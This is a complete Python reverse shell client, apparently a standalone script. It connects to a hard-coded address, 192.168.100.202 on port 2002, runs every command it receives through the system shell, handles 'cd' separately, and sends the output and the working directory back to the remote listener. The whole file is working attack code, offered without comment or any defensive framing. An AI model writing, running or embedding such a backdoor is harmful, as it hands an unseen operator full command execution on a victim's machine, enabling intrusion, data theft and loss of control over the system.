import os
import sys
import socket
import subprocess

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
host = '192.168.100.202'
port = 2002
s.connect((host, port))
while True:
    data = s.recv(1024)
    if data[:2].decode('utf-8')=='cd':
        os.chdir(data[3:].decode('utf-8'))
    if len(data)>0:
        cmd = subprocess.Popen(data[0:].decode('utf-8'),shell=True, stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
        output_bytes = cmd.stdout.read() + cmd.stderr.read()
        output_string = str(output_bytes,'utf-8')
        s.send(str.encode(output_string+str(os.getcwd()+" ")))
    else:
        print("Listener error..")
        sys.exit()